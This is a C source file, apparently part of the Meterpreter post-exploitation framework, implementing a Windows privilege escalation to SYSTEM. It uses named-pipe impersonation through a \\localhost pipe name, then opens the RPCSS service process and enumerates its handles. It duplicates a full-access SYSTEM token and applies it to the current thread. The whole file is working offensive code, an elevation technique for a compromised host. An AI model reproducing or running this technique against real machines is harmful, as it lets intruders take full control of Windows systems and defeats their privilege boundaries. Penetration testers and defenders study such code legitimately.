#include "precomp.h"
#include "common_metapi.h"
#include "namedpipe.h"
#include "service.h"

#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
#define STATUS_INFO_LENGTH_MISMATCH 0xc0000004
typedef NTSTATUS(WINAPI* NTQUERYINFORMATIONPROCESS)(HANDLE ProcessHandle, DWORD ProcessInformationClass, PVOID ProcessInformation, ULONG ProcessInformationLength, PULONG ReturnLength);
typedef NTSTATUS(WINAPI* NTQUERYOBJECT)(HANDLE Handle, DWORD ObjectInformationClass, PVOID ObjectInformation, ULONG ObjectInformationLength, PULONG ReturnLength);
typedef NTSTATUS(WINAPI* PRtlGetVersion)(LPOSVERSIONINFOEXW);

typedef enum _OBJECT_INFORMATION_CLASS {
	ObjectBasicInformation = 0,
	ObjectTypeInformation = 2
} OBJECT_INFORMATION_CLASS;

typedef enum _PROCESSINFOCLASS
{
	ProcessBasicInformation = 0,
	ProcessHandleInformation = 51,
} PROCESSINFOCLASS;

typedef struct _PROCESS_HANDLE_TABLE_ENTRY_INFO
{
	HANDLE HandleValue;
	ULONG_PTR HandleCount;
	ULONG_PTR PointerCount;
	ACCESS_MASK GrantedAccess;
	ULONG ObjectTypeIndex;
	ULONG HandleAttributes;
	ULONG Reserved;
} PROCESS_HANDLE_TABLE_ENTRY_INFO, * PPROCESS_HANDLE_TABLE_ENTRY_INFO;

typedef struct _PROCESS_HANDLE_SNAPSHOT_INFORMATION
{
	ULONG_PTR NumberOfHandles;
	ULONG_PTR Reserved;
	PROCESS_HANDLE_TABLE_ENTRY_INFO Handles[1];
} PROCESS_HANDLE_SNAPSHOT_INFORMATION, * PPROCESS_HANDLE_SNAPSHOT_INFORMATION;

typedef struct _OBJECT_TYPE_INFORMATION
{
	_UNICODE_STRING TypeName;
	ULONG TotalNumberOfObjects;
	ULONG TotalNumberOfHandles;
	ULONG TotalPagedPoolUsage;
	ULONG TotalNonPagedPoolUsage;
	ULONG TotalNamePoolUsage;
	ULONG TotalHandleTableUsage;
	ULONG HighWaterNumberOfObjects;
	ULONG HighWaterNumberOfHandles;
	ULONG HighWaterPagedPoolUsage;
	ULONG HighWaterNonPagedPoolUsage;
	ULONG HighWaterNamePoolUsage;
	ULONG HighWaterHandleTableUsage;
	ULONG InvalidAttributes;
	GENERIC_MAPPING GenericMapping;
	ULONG ValidAccessMask;
	BOOLEAN SecurityRequired;
	BOOLEAN MaintainHandleCount;
	UCHAR TypeIndex;
	CHAR ReservedByte;
	ULONG PoolType;
	ULONG DefaultPagedPoolCharge;
	ULONG DefaultNonPagedPoolCharge;
} OBJECT_TYPE_INFORMATION, * POBJECT_TYPE_INFORMATION;

/*
 * Compare two LUID values and return true if they are the same.
 */
BOOL is_equal_luid(const PLUID luid1, const PLUID luid2) {
	return ((luid1->HighPart == luid2->HighPart) && (luid1->LowPart == luid2->LowPart));
}

/*
 * Get the object type index for token objects. The index changes between versions and using it
 * simplifies the searching process.
 */
DWORD get_token_object_index(PULONG TokenIndex)
{
	HANDLE hToken = NULL;
	NTSTATUS status;
	HMODULE hNtdll = NULL;
	NTQUERYOBJECT pNtQueryObject = NULL;
	DWORD dwResult = ERROR_UNIDENTIFIED_ERROR;
	POBJECT_TYPE_INFORMATION pObjTypeInfo = NULL;
	ULONG ulLength = 0;

	do {
		if (!OpenProcessToken(GetCurrentProcess(), MAXIMUM_ALLOWED, &hToken)) {
			BREAK_ON_ERROR("[ELEVATE] get_token_object_index. OpenProcessToken failed");
		}

		hNtdll = GetModuleHandle("ntdll");
		if (hNtdll == NULL) {
			BREAK_ON_ERROR("[ELEVATE] get_token_object_index. GetModuleHandle(\"ntdll\") failed");
		}

		pNtQueryObject = (NTQUERYOBJECT)(GetProcAddress(hNtdll, "NtQueryObject"));
		if (pNtQueryObject == NULL) {
			BREAK_ON_ERROR("[ELEVATE] get_token_object_index. GetProcAddress(hNtdll, \"NtQueryObject\") failed");
		}

		status = pNtQueryObject(hToken, ObjectTypeInformation, NULL, 0, &ulLength);
		if (NT_SUCCESS(status)) {
			BREAK_WITH_ERROR("[ELEVATE] get_token_object_index. NtQueryObject failed (1st call)", HRESULT_FROM_NT(status));
		}

		pObjTypeInfo = (POBJECT_TYPE_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, ulLength);
		if (pObjTypeInfo == NULL) {
			BREAK_WITH_ERROR("[ELEVATE] get_token_object_index. HeapAlloc failed", ERROR_NOT_ENOUGH_MEMORY);
		}

		status = pNtQueryObject(hToken, ObjectTypeInformation, pObjTypeInfo, ulLength, NULL);
		if (!NT_SUCCESS(status)) {
			BREAK_WITH_ERROR("[ELEVATE] get_token_object_index. NtQueryObject failed (2nd call)", HRESULT_FROM_NT(status));
		}

		*TokenIndex = pObjTypeInfo->TypeIndex;
		dwResult = ERROR_SUCCESS;
	} while (0);

	if (pObjTypeInfo) {
		HeapFree(GetProcessHeap(), 0, pObjTypeInfo);
	}
	if (hToken) {
		CloseHandle(hToken);
	}
	return dwResult;
}

DWORD get_system_token(HANDLE hProc, PHANDLE phToken)
{
	NTSTATUS status = STATUS_INFO_LENGTH_MISMATCH;;
	PPROCESS_HANDLE_SNAPSHOT_INFORMATION pHandleInfo = NULL;
	ULONG ulLength = sizeof(PROCESS_HANDLE_SNAPSHOT_INFORMATION);
	ULONG tokenIndex;
	ULONG i;
	ULONG ulMaxPrivCount = 0;
	HANDLE hToken = NULL;
	HANDLE hBestToken = NULL;
	HANDLE hThread = GetCurrentThread();
	DWORD dwResult = ERROR_UNIDENTIFIED_ERROR;
	TOKEN_STATISTICS tokenStats;
	LUID systemLuid = SYSTEM_LUID;
	HMODULE hNtdll = NULL;
	NTQUERYINFORMATIONPROCESS pNtQueryInformationProcess = NULL;

	do {
		if (get_token_object_index(&tokenIndex) != ERROR_SUCCESS) {
			BREAK_WITH_ERROR("[ELEVATE] get_system_token. get_token_object_index failed", ERROR_UNIDENTIFIED_ERROR);
		}

		hNtdll = GetModuleHandle("ntdll");
		if (hNtdll == NULL) {
			BREAK_ON_ERROR("[ELEVATE] get_system_token. GetModuleHandle(\"ntdll\") failed");
		}

		pNtQueryInformationProcess = (NTQUERYINFORMATIONPROCESS)(GetProcAddress(hNtdll, "NtQueryInformationProcess"));
		if (pNtQueryInformationProcess == NULL) {
			BREAK_ON_ERROR("[ELEVATE] get_system_token. GetProcAddress(hNtdll, \"NtQueryInformationProcess\") failed");
		}

		do {
			ulLength += (sizeof(PROCESS_HANDLE_TABLE_ENTRY_INFO) * 16);
			if (pHandleInfo) {
				HeapFree(GetProcessHeap(), 0, pHandleInfo);
				pHandleInfo = NULL;
			}
			pHandleInfo = (PPROCESS_HANDLE_SNAPSHOT_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, ulLength);
			if (pHandleInfo == NULL) {
				BREAK_WITH_ERROR("[ELEVATE] get_system_token. HeapAlloc failed", ERROR_NOT_ENOUGH_MEMORY);
			}

			status = pNtQueryInformationProcess(hProc, ProcessHandleInformation, pHandleInfo, ulLength, &ulLength);
			if (NT_SUCCESS(status)) {
				break;
			}
			if (status == STATUS_INFO_LENGTH_MISMATCH) {
				continue;
			}
			dprintf("NtQueryInformationProcess returned NT_STATUS: %ul", status);
			BREAK_WITH_ERROR("[ELEVATE] get_system_token. NtQueryInformationProcess failed", status);
		} while (status == STATUS_INFO_LENGTH_MISMATCH);

		if (!NT_SUCCESS(status)) {
			BREAK_WITH_ERROR("[ELEVATE] get_system_token. failed to retrieve process handle information", ERROR_UNIDENTIFIED_ERROR);
		}

		for (i = 0; i < pHandleInfo->NumberOfHandles; i++) {
			if (pHandleInfo->Handles[i].ObjectTypeIndex != tokenIndex) {
				continue;
			}

			if ((pHandleInfo->Handles[i].GrantedAccess & TOKEN_ALL_ACCESS) != TOKEN_ALL_ACCESS) {
				continue;
			}

			if (!DuplicateHandle(hProc, pHandleInfo->Handles[i].HandleValue, GetCurrentProcess(), &hToken, 0, FALSE, DUPLICATE_SAME_ACCESS)) {
				CONTINUE_ON_ERROR("[ELEVATE] get_system_token. DuplicateHandle failed");
			}

			if (!GetTokenInformation(hToken, TokenStatistics, &tokenStats, sizeof(tokenStats), &ulLength)) {
				CloseHandle(hToken);
				CONTINUE_ON_ERROR("[ELEVATE] get_system_token. GetTokenInformation failed");
			}

			if (!is_equal_luid(&tokenStats.AuthenticationId, &systemLuid)) {
				CloseHandle(hToken);
				continue;
			}

			if (tokenStats.PrivilegeCount <= ulMaxPrivCount) {
				CloseHandle(hToken);
				continue;
			}

			// newer versions of windows have more defined privileges so update the best token to the one with the most
			ulMaxPrivCount = tokenStats.PrivilegeCount;
			if (hBestToken) {
				CloseHandle(hBestToken);
			}
			hBestToken = hToken;
		}
	} while (0);

	if (hBestToken) {
		*phToken = hBestToken;
		dwResult = ERROR_SUCCESS;
	}
	if (pHandleInfo) {
		HeapFree(GetProcessHeap(), 0, pHandleInfo);
	}
	return dwResult;
}

DWORD post_callback_use_rpcss(Remote* remote)
{
	SC_HANDLE hScm = NULL;
	SC_HANDLE hSvc = NULL;
	HANDLE hProc = NULL;
	HANDLE hThread = GetCurrentThread();
	SERVICE_STATUS_PROCESS procInfo;
	DWORD dwBytes;
	DWORD dwResult = ERROR_ACCESS_DENIED;
	HANDLE hToken = NULL;

	do {
		hScm = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT);
		if (hScm == NULL) {
			BREAK_ON_ERROR("[ELEVATE] post_callback_use_rpcss. OpenSCManager failed");
		}

		hSvc = OpenService(hScm, "rpcss", SERVICE_QUERY_STATUS);
		if (hSvc == NULL) {
			BREAK_ON_ERROR("[ELEVATE] post_callback_use_rpcss. OpenService failed");
		}

		if (!QueryServiceStatusEx(hSvc, SC_STATUS_PROCESS_INFO, (LPBYTE)&procInfo, sizeof(procInfo), &dwBytes)) {
			BREAK_ON_ERROR("[ELEVATE] post_callback_use_rpcss. QueryServiceStatusEx failed");
		}

		hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, procInfo.dwProcessId);
		if (hProc == NULL) {
			BREAK_ON_ERROR("[ELEVATE] post_callback_use_rpcss. OpenProcess failed");
		}

		if (get_system_token(hProc, &hToken) != ERROR_SUCCESS) {
			BREAK_WITH_ERROR("[ELEVATE] post_callback_use_rpcss. get_system_token failed", ERROR_UNIDENTIFIED_ERROR);
		}

		if (!SetThreadToken(&hThread, hToken)) {
			CloseHandle(hToken);
			BREAK_WITH_ERROR("[ELEVATE] post_callback_use_rpcss. SetThreadToken failed", ERROR_ACCESS_DENIED);
		}

		dwResult = ERROR_SUCCESS;
		dprintf("[ELEVATE] post_callback_use_rpcss. dispatching to use_self");
		met_api->thread.update_token(remote, hToken);
		return ERROR_SUCCESS;
	} while (0);

	if (hProc) {
		CloseHandle(hProc);
		hProc = NULL;
	}

	if (hSvc) {
		CloseServiceHandle(hSvc);
		hSvc = NULL;
	}

	if (hScm) {
		CloseServiceHandle(hScm);
		hScm = NULL;
	}
	return dwResult;
}

DWORD elevate_via_service_namedpipe_rpcss(Remote* remote, Packet* packet)
{
	DWORD dwResult = ERROR_ACCESS_DENIED;
	THREAD* pThread = NULL;
	HANDLE hSem = NULL;
	char cPipeName1[MAX_PATH] = { 0 };
	char cPipeName2[MAX_PATH] = { 0 };
	HMODULE hNtdll = NULL;
	OSVERSIONINFOEXW os = { 0 };
	HANDLE hPipe = NULL;
	DWORD dwPipeUid[2] = { 0, 0 };
	PRIV_POST_IMPERSONATION PostImpersonation;
	PRtlGetVersion pRtlGetVersion = NULL;

	do {
		hNtdll = GetModuleHandleA("ntdll");
		if (hNtdll == NULL) {
			BREAK_ON_ERROR("[ELEVATE] elevate_via_service_namedpipe_rpcss: Failed to resolve RtlGetVersion");
		}

		pRtlGetVersion = (PRtlGetVersion)GetProcAddress(hNtdll, "RtlGetVersion");
		if (pRtlGetVersion == NULL) {
			BREAK_ON_ERROR("[ELEVATE] elevate_via_service_namedpipe_rpcss: Failed to resolve RtlGetVersion");
		}

		if (pRtlGetVersion(&os)) {
			BREAK_ON_ERROR("[ELEVATE] elevate_via_service_namedpipe_rpcss: RtlGetVersion failed");
		}

		// filter out systems older than Windows 8.1 / Server 2012 R2 (6.3) for this technique
		if ((os.dwMajorVersion < 6) || (os.dwMajorVersion == 6 && os.dwMinorVersion < 3)) {
			SetLastError(ERROR_CALL_NOT_IMPLEMENTED);
			BREAK_ON_ERROR("[ELEVATE] elevate_via_service_namedpipe_rpcss: Windows versions older than 6.3 are unsupported");
		}

		// generate a pseudo random name for the pipe
		dwPipeUid[0] = ((rand() << 16) | rand());
		dwPipeUid[1] = ((rand() << 16) | rand());

		_snprintf_s(cPipeName1, sizeof(cPipeName1), MAX_PATH, "\\\\.\\pipe\\%08x%08x", dwPipeUid[0], dwPipeUid[1]);
		// this *MUST* use the "\\localhost\pipe" prefix and not the "\\.\pipe" prefix
		_snprintf_s(cPipeName2, sizeof(cPipeName2), MAX_PATH, "\\\\localhost\\pipe\\%08x%08x", dwPipeUid[0], dwPipeUid[1]);

		dprintf("[ELEVATE] elevate_via_service_namedpipe_rpcss. using pipename: %s", cPipeName1);

		hSem = CreateSemaphore(NULL, 0, 1, NULL);
		PostImpersonation.pCallback = post_callback_use_rpcss;
		PostImpersonation.pCallbackParam = remote;
		pThread = met_api->thread.create(elevate_namedpipe_thread, &cPipeName1, hSem, &PostImpersonation);
		if (!pThread) {
			BREAK_WITH_ERROR("[ELEVATE] elevate_via_service_namedpipe_rpcss. met_api->thread.create failed", ERROR_INVALID_HANDLE);
		}

		if (!met_api->thread.run(pThread)) {
			BREAK_WITH_ERROR("[ELEVATE] elevate_via_service_namedpipe_rpcss. met_api->thread.run failed", ERROR_ACCESS_DENIED);
		}

		// wait for the thread to create the pipe, if it times out terminate
		if (hSem) {
			if (WaitForSingleObject(hSem, 500) != WAIT_OBJECT_0) {
				BREAK_WITH_ERROR("[ELEVATE] elevate_via_service_namedpipe_rpcss. WaitForSingleObject failed", ERROR_ACCESS_DENIED);
			}
		} else {
			Sleep(500);
		}

		hPipe = CreateFile(cPipeName2, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
		if (hPipe == INVALID_HANDLE_VALUE) {
			BREAK_ON_ERROR("[ELEVATE] elevate_via_service_namedpipe_rpcss. CreateFile failed");
		}

		if (!WriteFile(hPipe, "\x00", 1, NULL, NULL)) {
			BREAK_ON_ERROR("[ELEVATE] elevate_via_service_namedpipe_rpcss. WriteFile failed");
		}

		WaitForSingleObject(pThread->handle, 5000);
		met_api->thread.sigterm(pThread);
		met_api->thread.join(pThread);

		if (!GetExitCodeThread(pThread->handle, &dwResult)) {
			BREAK_WITH_ERROR("[ELEVATE] elevate_via_service_namedpipe_rpcss. GetExitCodeThread failed", ERROR_INVALID_HANDLE);
		}
	} while (0);

	if (hPipe) {
		CloseHandle(hPipe);
	}
	if (pThread) {
		met_api->thread.destroy(pThread);
	}
	if (hSem) {
		CloseHandle(hSem);
	}
	return dwResult;
}